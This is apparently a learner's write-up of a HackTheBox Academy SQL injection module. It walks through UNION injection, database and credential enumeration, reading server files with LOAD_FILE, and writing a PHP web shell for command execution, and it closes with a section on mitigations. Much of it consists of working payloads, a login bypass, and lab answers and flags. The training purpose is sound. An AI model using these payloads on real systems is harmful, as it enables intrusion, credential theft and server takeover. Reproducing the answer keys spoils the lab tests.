For example, we can use any string as our junk data, and the query will return the string as its output for that column. If we UNION with the string "junk", the SELECT query would be SELECT "junk" from passwords, which will always return junk. We can also use numbers. For example, the query SELECT 1 from passwords will always return 1 as the output.

Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.

Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

The products table has two columns in the above example, so we have to UNION with two columns. If we only wanted to get one column 'e.g. username', we have to do username, 2, such that we have the same number of columns:
```
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
In case we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used SELECT on a table with 4 columns, our UNION injection would be:
```
UNION SELECT username, 2, 3, 4 from passwords-- '
```
This query would return:
```
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

As we can see, our wanted output of the 'UNION SELECT username from passwords' query is found at the first column of the second row, while the numbers filled the remaining columns.

# HTB Academy Question 

Q: Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

A: 300033
##### Solution:
To found the above answer use the following the query 
```
SELECT * FROM employees UNION select *, NULL, NULL, NULL, NULL from departments;
```
So why this query so we when we use describe employees; query this will show us 5 columns and when we use describe departments; so this will show us 2 columns so Union clause only work when we have same number of columns so we fill all the extra columns with NULL Bytes so we can see the answer this will take some time to show result so be relax


Union Injection
===============

Now we know what is Union clause and how they work so now we use what we learn above to perform sql injection with Union Clause

Let take an example of URL 
```
http://SERVER_IP:PORT/search.php?port_code=cn
```
There we have a search bar so we can search for Port code if we enter single quote(') in the search bar they show us sql error so we know that site is vulnerable to sql injection and we can see sql queries result there also


Detect number of columns
------------------------

Before going ahead and Union based queries, we need to find the number of columns selected by the server.There are two methods of detecting the number of columns:

 1.   Using ORDER BY
 2.   Using UNION


Using ORDER BY
==============

The first way of detecting the number of columns is through the use of the ORDER BY function, which we discussed earlier. We basically have to inject a query that sorts the results by a certain column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2, and then order by 3, until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist.

The final successful column we successfully sorted by gives us the total number of columns.

If we failed at order by 4, this means the table has 3 columns, which is the number of columns we were able to sort by successfully. Let's go back to our previous example and attempt the same, with the following payload
```
' order by 1-- -
```
Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).

So now we put it into our previous example we suppose above 
```
http://SERVER_IP:PORT/search.php?port_code='order by 1 -- -
```
We do the same for column 3 and 4 and get the results back. However, when we try to ORDER BY column 5, we get the following error:
```
http://SERVER_IP:PORT/search.php?port_code='order by 5 -- -
```
Unknown column '5' in 'order clause'

This means that this table has exactly 4 columns .

Using UNION
-----------

The other method is to attempt a Union injection with a different number of columns until we successfully get the results back.

The first method always returns the results until we hit an error, while this method always gives an error until we get a success.

We can start by injecting a 3 column UNION query:
```
cn' UNION select 1,2,3-- -
```
We get an error saying that the number of columns don’t match: 
```
http://SERVER_IP:PORT/search.php?port_code=' UNION select 1,2,3-- -
```
So, let’s try four columns and see the response:
```
cn' UNION select 1,2,3,4-- -
```
```
http://SERVER_IP:PORT/search.php?port_code=' UNION select 1,2,3,4-- -
```
This time we successfully get the results, meaning once again that the table has 4 columns. We can use either method to determine the number of columns. Once we know the number of columns, we know how to form our payload, and we can proceed to the next step.

Location of Injection
---------------------

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection

Suppose our above payload inject four columns but we saw only 2,3 and 4 columns on the screen 

It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it.

This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. We cannot place our injection at the beginning, or its output will not be printed.

This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the @@version SQL query as a test and place it in the second column instead of the number 2
```
cn' UNION select 1,@@version,3,4-- -
```
```
http://SERVER_IP:PORT/search.php?port_code=' UNION select 1,@@version,3,4-- -
```
So now they display database number on the first column rather then 2 so we use this to modify our payload position to get our desire result on the screen.

# HTB Academy Question

Q1: Use a Union injection to get the result of 'user()'

A: root@localhost
##### Solution:

TO find the answer above first we have to find how many number of columns table have so to do this we have to use one of the above technique to find the number of columns so i use ORDER by caluse like this
```
' ORDER BY 1 -- -
```
this will show me result so i change the 1 into 2 and they also show me result so again change it into 3 and so on they show me result in 4 but don't show me result with 5 so now i know they have 4 columns so now we know let go on

Now we have to check which column is show output on the screen so i use union clause to find this with the following command 
```
' UNION SELECT 1,2,3,4 -- -
```
this will show all the result and in the last they show us number in the columns and they are 2,3 and 4 so now we know the first columns is not show us output so we know the attack position to build our payload like this
```
' UNION SELECT 2,@@version,user(),4 -- - 
```
this payload show 2 after that they show us database version number and after that they show us database user and after that they show us 4 

Database Enumeration
====================

In the previous sections, we learned about different SQL queries in MySQL and learned about SQL injections and how to use them. This section will put all of that to use and gather data from the database by using SQL queries within SQL injections.

MySQL Fingerprinting
====================

Before we can enumerate the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.

As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies for Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. However, this is a far-fetched guess, as many other databases can be used on either type of operating system or web server. So, there are different queries we can test to fingerprint the type of database we are dealing with.

As we are covering MySQL in this module, let's see how to fingerprint MySQL databases. The following queries and their output will tell us that we are dealing with 


MySQL
-----

1. `SELECT @@version` use this payload when you have full output of the query so if the query work you get the output like `MySQL Version` 'i.e. `10.3.22-MariaDB-1ubuntu1`
and if you get some error so they are like this In MSSQL it returns MSSQL version. `Error with other DBMS`

2. `SELECT POW(1,1)` use this payload when you get only numeric output on the screen and they expected output is "1" if its works and if not so you get the error "Error with other DBMS"

3. `SELECT SLEEP(5)` use this when you get no output to the screen and you blindly check they are vulnerable or not. so if they are vulnerable so you get delays to get any respose to the page about 5 sec and returns 0 and if everything not get correct so you get output like this "Will not delay response with other DBMS"


INFORMATION_SCHEMA Database
---------------------------

To pull data from tables using UNION SELECT, we need to form our SELECT queries properly. To do so, we need the following information:

    1. List of databases
    2. List of tables within each database
    3. List of columns within each table

With the above information, we can form our SELECT statement to dump data from any column in any table within any databases inside the DBMS. This is where we can utilize the INFORMATION_SCHEMA Database.

The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.

So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
```
SELECT * FROM my_database.users;
```
Similarly, we can look at tables present in the INFORMATION_SCHEMA Database.

SCHEMATA
--------

To start our enumeration, we should find what databases are available on the DBMS. The SCHEMATA table in the INFORMATION_SCHEMA database contains information about all databases on the server. It is used to obtain database names so that we can then query them. The SCHEMA_NAME column contains all the database names currently present.



Let's first test this on a local database to see how the query is used:

```
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

We see the ilfreight and dev databases.

Note: The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DM enumeration. Sometimes there's a forth 'sys' DB as well.

Now, let's do the same using a UNION SQL injection, with the following payload:

SQL CODE:
```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
so this payload we use with our above supposed web site example so we can see the both the tables on the webserver

now Let's find out which database the web application is running to retrieve ports data from. We can find the current database with the SELECT database() query. We can do this similarly to how we found the DBMS version in the previous section:

```
cn' UNION select 1,database(),2,3-- -
```
We see that the database name is ilfreight. The other database (dev) looks interesting. So, let’s try to retrieve the tables from it.

TABLES
------

Before we can dump data from the dev database, we need to get a list of the tables within it to query them with a SELECT statement. To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.

The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we're interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA columns point to the database each table belongs to. This can be done similarly to how we found the database names. We can use the following payload to find the tables within the dev database:

```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
``` 

Note how replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.

Note: we added a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.

SO when this query works they show us  all the tables name of dev database so we can dump in

COLUMNS
-------

To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this. As we did before, let's try this payload to find the column names in the credentials table:

```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

So after success they show us all the columns name in the mentioned table and suppose that is username and credential

Data
----

Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:

```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.

We were able to get all the entries in the credentials table, which contains sensitive information such as password hashes and an API key.

HTB Academy Question
--------------------

Q: What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?

A: 9da2c9bcdf39d8610954e0e11ea8f45f
#### Solution:
To find the answer of the above question we first have to gether information about how many databases they have how many table they have and how many columns they have to find the answer and in they privious htb academy question we know the position where we see our result to modify our payload so now we use that information to get sensitive data so we have to find how many databases they have to do that we use the following query

```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
``` 

this query show us how many databases they have and they show two databases name "dev" and "ilfreight" so now we know how many database so now we have to know how many tables in the database so to do that we use the following query

```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
```

this query show us totel number of tables in the ilfreight database and they show three tables and there name is "ports","users" and "products" so now we know the tables name so now we need totel number of columns in the table so we can use the following query to find this

```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
``` 

this query shows totel number of columns in the users table and they show us six columns and his name is "USER","CURRENT_CONNECTIONS","TOTEL_CONNECTIONS","id","username" and "password". Now we know everything we need to get the answer so in the question they asked to get newuser password hash in the users table and we know their is column name username and password so we use the following query to get it

```
cn' UNION select 1, username, password, 4 from ilfreight.users-- -
``` 

this show us  username and password hashes of two users and that is admin and there password hash is "392037dbba51f692776d6cefb6dd546d" and newuser and there password hash is "9da2c9bcdf39d8610954e0e11ea8f45f" and we now we submit it and we got it

Reading Files
=============

 addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.


Privileges
----------

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. In MySQL the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will be able to read and/or write files to the back-end server.

DB User
-------

First, we have to determine which user we are within the database. While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we don't, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:

SQL CODE
--------
```
SELECT USER()
```
```
SELECT CURRENT_USER()
```
```
SELECT user from mysql.user
```
Our UNION injection payload will be as follows:
```
cn' UNION SELECT 1, user(), 3, 4-- -
```
OR
```
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
Which tells us our current user, which in this case is root:

This is very promising, as a root user is likely to be a DBA, which gives us a lot of privileges.

User Privileges
---------------

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

SQL CODE
--------
```
SELECT super_priv FROM mysql.user
```
Once again, we can use the following payload with the above query:
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root

SQL CODE
--------
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
if the query return `Y`, which mean yes then they idicating we have superuser privileges

We can also dump other privileges we have directly from the schema, with the following query
```
SELECT sql_grants FROM information_schema.sql_show_grants
```
Once again, we can add WHERE user="root" to only show privileges for our current user root. Our payload would be

SQL CODE
--------
```
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -
```
And we see all of the possible privileges given to our current user: 

We see that our user has YES to all privileges. Most importantly, the FILE privilege is also enabled, enabling us to read files and potentially even write files. We can proceed with attempting to read files.


LOAD_FILE
---------

Now that we know we have enough privileges to read local system files, let's try to do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the '/etc/passwd/' file:


Code: sql
---------
```
SELECT LOAD_FILE('/etc/passwd');
```

Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.


Similarly to how we have been using a UNION injection, we can use the above query:

SQL CODE
--------
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

to do that we are able to read the content of that file if every thing is good and this could be use to get application source code

Another Example
---------------

We know that the current page is search.php. The default Apache webroot is /var/www/html. Let's try reading the source code of the file at /var/www/html/search.php with the following query

### sql code

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

The code is rendered as a html in the browser we have to see the source code with CTRL + U key or manuly use source code option in the browser

The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.


HTB Academy Question
--------------------

Q: We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.

A: dB_pAssw0rd_iS_flag!
###### Solution:

To find the answer above we have to first know about how php include() work so i google it and try to know about it and found the following link helpfull

link: `https://www.tutorialrepublic.com/php-tutorial/php-include-files.php`

so when i read it and see the example i came to know about the include function is allow you to  include the code contained in php file within  another php file so we can reuse it again and again with out need to type it again and in the above link they show us an example in which first we have to include the file in the html so then we can use it.

So know we know how include work so first we have to check which file is include in the html page so by scroll up to the html page source code i found that code
```
<?php include "config.php";?>
```
so from their we know which file is include in the source code so we can load it with  the sql load function with the following query 

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

so this file shows us the the database password and db username or other things



Writing Files
=============

When it comes to writing files to the back-end server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to be able to write files. Before attempting to write files, we must first check if we have enough privileges to do so and if the DBMS allows writing files.

Write File Privileges
---------------------

To be able to write files to the back-end server using a MySQL database, we require three things:

    1. User with FILE privileges enabled
    
    2. MySQL global secure_file_priv variable not enabled
    
    3. Write access to the location we want to write to on the back-end server


We have already found that our current user has the FILE privileges necessary to write files. We must now check if the MySQL database has that privileges. This can be done by checking the secure_file_priv global variable.

secure_file_priv
----------------

The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files from anywhere within the system.

So, let's see how we can find out the value of secure_file_priv. Within MySQL, we can use the following query to obtain the value of this variable

SQL CODE
--------
```
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. For MySQL global variables, they are stored within a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.


We have to select these two columns from that table in the INFORMATION_SCHEMA database. As there are hundreds of global variables in a MySQL configuration, we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.

The final SQL query is the following:

SQL CODE
--------
```
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

So, similarly to other UNION injection queries, we can get the result of the above query with the following payload 'remember to add two more columns 1 & 4 as junk data to have a total of 4 columns':


SQL CODE
--------
```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

If the result shows that the sucure_file_priv value is empty, meanining that we can read/write files to any location. That's Great!


SELECT INTO OUTFILE
-------------------

Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the SELECT .. INTO OUTFILE statement. The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.


To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file

SQL CODE
--------
```
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

If we go to the back-end server and cat the file, we see that table's content:

```
htb[/htb]$ cat /tmp/credentials 
1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.

SQL CODE
--------
```
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
When we cat the file, we see that text:

```
htb[/htb]$ cat /tmp/test.txt 
htb[/htb]$ ls -la /tmp/test.txt 
-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

As we can see above, the test.txt file was created successfully and is owned by the mysql user.

Tip: advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

Writing Files through SQL Injection
-----------------------------------

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write file written successfully! to the /var/www/html/proof.txt file, which we can then access on the web application:

SQL CODE
--------
```
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

If we don't see any errors on the page,which indicates that the query succeeded. checking for the file proof.txt on the web root,we see that it indeed exits

Writing a Web Shell
-------------------

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can will write the following PHP webshell, to be able to execute commands directly on the back-end server

PHP CODE
--------
```
<?php system($_REQUEST[0]); ?>
```

We can reuse our previous UNION injection payload, and change the string to the above, and the file name to shell.php

SQL CODE
--------
```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Again if we don't see any errors which means the file write on the backend web root directory and its probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter,with ?0=id on our URL like following 
```
http://server_ip:port/shell.php?0=id
```
The output of the id command confirms that we have code execution and are running as the www-data user.


HTB Academy Question
--------------------

Q: Find the flag by using a webshell.

A: d2b5b27ae688b6a0f1d21b7d3a0798cd99e814f8d65dfdba8ddd50e6e750e575

When you use the following query on the search bar 

SQL QUERY
```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
this will creat a file name shell.php on the web root of the server so you can visit it with the following URL
```
http://Server_Ip:Port/shell.php
```
if you do and they are exits so you can executes command with the parameter `?0=<Command>`
like this 

 
`http://Server_Ip:Port/shell.php?0=ls -al`

if the command works and you see the output on the screen so you have the command execution so to find the flag HTB give us hint that that are back one step so this means the flag.txt locate on /var/www/flag.txt so we can cat it with the following URL 

```
http://Server_Ip:Port/shell.php?0=cat /var/www/flag.txt
```
this will show us the flag



Mitigation SQL Injection
========================

We have learned about SQL injections, why they occur, and how we can exploit them. We should also learn how to avoid such vulnerabilities in our code and patch them when found. Let's look at some examples of how SQL Injection can be identified and mitigated.

Input Sanitization


Here's the snippet of the code from the authentication bypass section we discussed earlier:

#### PHP CODE
 
 ```
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";

  if (!mysqli_query($conn ,$query))
  {
          die('Error: ' . mysqli_error($conn));
  }

  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>
```
As we can see, the script takes in the username and password from the POST request and passes it to the query directly. This will let an attacker inject anything they wish and exploit the application. Injection can be avoided by sanitizing any user input; rendering injected queries useless. Libraries provide multiple functions to achieve this, one such example is the mysqli_real_escape_string() function. This function escapes characters such as ' and ", such that they don't hold any special meaning.


PHP CODE
--------

````
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>


````

Now if you try to use sql injection on that backend source code they will not allow you to authenticate bypass because of `real_escape_string()`.A similar example is the `pg_escape_string()` which used to escape PostgreSQL queries.

Input Validation
----------------

User input can also be validated based on the data used to query to ensure that it matches the expected input. For example, when taking an email as an input, we can validate that the input is in the form of `...@email.com`, and so on.

Consider the following code snippet from the ports page, which we used UNION injections on

PHP CODE
--------

````
<?php
if (isset($_GET["port_code"])) {
    $q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
    $result = pg_query($conn,$q);
    
    if (!$result)
    {
        die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
    }
<SNIP>
?>
````

We see the GET parameter port_code being used in the query directly. It's already known that a port code consists only of letters or spaces. We can restrict the user input to only these characters, which will prevent the injection of queries. A regular expression can be used for the validating the input

PHP CODE
--------

````

<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>

````

The code is modified to use the preg_match() function, which checks if the input matches the given pattern or not. The pattern used is [A-Za-z\s]+, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.

We can test the following injection:

SQL CODE
--------
```
'; SELECT 1,2,3,4-- -
```
if we use this query to the port code this will show us nothing and the query is rejected

User Privileges
---------------

As discussed initially, DBMS software allows the creation of users with fine grained permissions. We should ensure that the user querying the database only has minimum permissions.

Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.

```
MariaDB [(none)]> CREATE USER 'reader'@'localhost';
Query OK, 0 rows affected (0.002 sec)

MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
Query OK, 0 rows affected (0.000 sec)
```

The commands above add a new MariaDB user named reader who is granted only SELECT privileges on the ports table. We can verify the permissions for this user by logging in:

```
htb[/htb]$ mysql -u reader -p

MariaDB [(none)]> use ilfreight

MariaDB [ilfreight]> SHOW TABLES;
+---------------------+
| Tables_in_ilfreight |
+---------------------+
| ports               |
+---------------------+
1 row in set (0.000 sec)

MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| ilfreight          |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [ilfreight]> SELECT * FROM dev.credentials;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
```

The snippet above confirms that the reader user has no privileges to query any tables in the ilfreight and the dev database. The user only has access to the ports table that is needed by the application.

Web Application Firewall
------------------------

Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed. WAF can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string INFORMATION_SCHEMA would be rejected, as it's commonly used while exploiting SQL injection.

Parameterized Queries
---------------------

Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.

Consider the following modified code:

PHP CODE
--------

```

<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>

```

The query is modified to contain two placeholders, marked with ? where the username and password will be placed. We then bind the username and password to the query using the mysqli_stmt_bind_param() function. This will safely escape any quotes and place the values in the query.


Conclusion
----------

The list above is not comprehensive in any way, and it could still be possible to exploit SQL injection based on the application logic. The code examples shown are based on PHP, but the logic applies across all common languages and their libraries.


Skills Assessment - SQL Injection Fundamentals
==============================================

The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.

image

Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!


HTB Academy Question
====================

Q:  Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

A: 528d6d9cedc2c7aab146ef226e918396

##### Solution
Enumeration
-----------
First we have to enumerate the webserver that we found so we have the IP that holds a webserver when we visit it they give us a login page that required username and password that we check if they are vulnerable to sql injection or not so we can do this with the following payloads 

Payload
=======

```
hello ' OR 1=1 -- -
```
this payload we use on username section and write anything on password section

It works so we login to the site and now our link become like this
```
http://SERVER_IP:PORT/dashboard/dashboard.php
```
we we are in dasboard and we see the search bar there so now we can check this for union injection to get the information from the database to do that first we have to check the number of columns to made our payload to do that we use order by clause payload on search bar

PAYLOAD
-------

```
a ' ORDER BY 1 -- -
```
when we use this on search bar they show us nothing that means they have one column but we have to totel number of columns so we increment the number like order by 2 , order by 3 .. etc so when we use order by 6 they show us an error that says ' Unknown column '6' in 'order clause'
this means they have 5 columns so now we know totel number of columns now we have to find attack positions to build our payload to do this we use the following payload 

PAYLOAD
-------

```
a ' UNION SELECT 1 ,2 ,3 ,4 ,5 -- - 
```
So when we use this this shows us 2 3 4 and 5 number on the screen so this means we can only see that positions to see our output 

Now we know the totel number of columns and the attack positions to see out result now we start enumerating Database 

DATABASE Enumeration
--------------------

First we have to know which user the database we use so to do that we use the following payload 

PAYLOAD
-------

```
cn' UNION SELECT 1, user(), 3, 4,5 -- -
```
this show us the user we are using and that is `root@localhost`

Now we have to find privilege to that user to do that we use the following payload 

PAYLOAD
-------

```
cn' UNION SELECT 1, super_priv, 3, 4,5 FROM mysql.user WHERE user="root"-- -
```
this payload show us if we have super priv or not if they show yes we have other wise not

And we use the following payload to get which totel queries our use can use 

```
cn' UNION SELECT 1, grantee, privilege_type, is_grantable ,5 FROM information_schema.user_privileges-- -
```
this will show us all the queries we can use with that use and we can see we can read and write files with that user 

So now we know our user privleges and also we know we can read and write files from that user so let use it so we can read file from the system with the following payload 

PAYLOAD
-------

```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4,5-- -
```
this will show us the passwd file data so we can read it we can use it to get source files as we know the location is `/var/www/html/dashboard/dashboard.php and /var/www/html/index,php`

So now we write php webshell to the system to get remote code execution on the server we can do this with the following payload

PAYLOAD
-------

```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "","" into outfile '/var/www/html/dashboard/shell.php'-- -
```
this will make a file called shell.php on the server and we can use ?0=<command> parameter to execute commands on the server like this
```
http://SERVER_IP:PORT/dashboard/shell.php?0=id
```
This payload will show us the command result of id command on the page if everything is going right so to that we have the command execution on the server so now we can read the flag to the root directory(/) of the server but first we have to know the name of the file so we use ls command on the root directory that show us all the files and directory of the server root directory so the url is like the following 
```
http://SERVER_IP:PORT/dashboard/shell.php?0=ls /
```
After that we can see all the files in the dirctory so there is a file name  flag_cae1dadcd174.txt that contain the flag we can read it with cat command so now the url become like the following 
```
http://SERVER_IP:PORT/dashboard/shell.php?0=cat /flag_cae1dadcd174.txt
```
this will show us the flag that we submit to the HTB Academy Assessment part 

NOTE: we can read that file with load_file query but we dont know the file name in that step so as now we know it so we can read it now like the following payload

PAYLOAD
-------

```
cn' UNION SELECT 1, LOAD_FILE("/flag_cae1dadcd174.txt"), 3, 4,5-- -
